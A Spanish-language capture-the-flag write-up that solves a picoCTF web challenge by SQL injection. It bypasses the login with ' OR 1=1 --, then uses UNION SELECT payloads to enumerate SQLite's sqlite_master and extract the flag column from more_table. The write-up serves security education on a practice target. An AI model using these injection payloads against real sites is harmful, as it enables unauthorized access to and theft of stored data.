## Descripcion
Can you find the flag on this website.

Try to find the flag [here](http://saturn.picoctf.net:63867/).
## Solucion
### 1. Primero entra al sitio

Pulsa **"Try to find the flag here"**.

Te aparecerá un formulario de inicio de sesión. La primera meta es **bypassear el login**.

Prueba:

**Username**

```
' OR 1=1 --
```

**Password**

```
' OR 1=1 --
```

También puede funcionar dejando uno de los campos como:

```
' OR 1=1 --
```

La idea es convertir una consulta parecida a:

```
SELECT * FROM users
WHERE username = 'lo_que_escribiste'
AND password = 'lo_que_escribiste';
```

en algo equivalente a:

```
SELECT * FROM users
WHERE username = '' OR 1=1 --'
AND password = '...';
```

`1=1` siempre es verdadero y `--` comenta el resto de la consulta.

---

### 2. Una vez dentro, busca la caja de búsqueda

El reto normalmente te muestra registros con algo parecido a:

```
City | Address | Phone
```

Aquí viene la parte importante: **hay 3 columnas**.

Vamos a aprovechar `UNION SELECT`.

Prueba en el buscador:

```
' UNION SELECT 1,2,3 --
```

Si aparecen resultados, confirmamos que son **3 columnas**.

---

### 3. Averiguar las tablas de SQLite

Como la pista dice `SQLiLite`, no debemos usar `information_schema` como haríamos en MySQL/PostgreSQL.

SQLite tiene una tabla especial:

```
sqlite_master
```

Prueba:

```
' UNION SELECT name,2,3 FROM sqlite_master --
```

Deberías empezar a ver nombres de tablas.

Busca especialmente algo parecido a:

```
more_table
```

Ese es precisamente el nombre de la tabla que contiene el flag en este reto.

---

### 4. Averiguar qué contiene `more_table`

Ahora podemos pedirle a SQLite la definición de esa tabla:

```
' UNION SELECT sql,2,3 FROM sqlite_master WHERE name='more_table' --
```

Deberías obtener algo parecido a:

```
CREATE TABLE more_table (
    id INTEGER,
    flag TEXT
)
```

Lo importante aquí es descubrir que existe una columna llamada:

```
flag
```

---

### 5. Sacar el flag

Finalmente, en el buscador coloca:

```
' UNION SELECT flag,2,3 FROM more_table --
```
## Notas adicionales

## Referencias
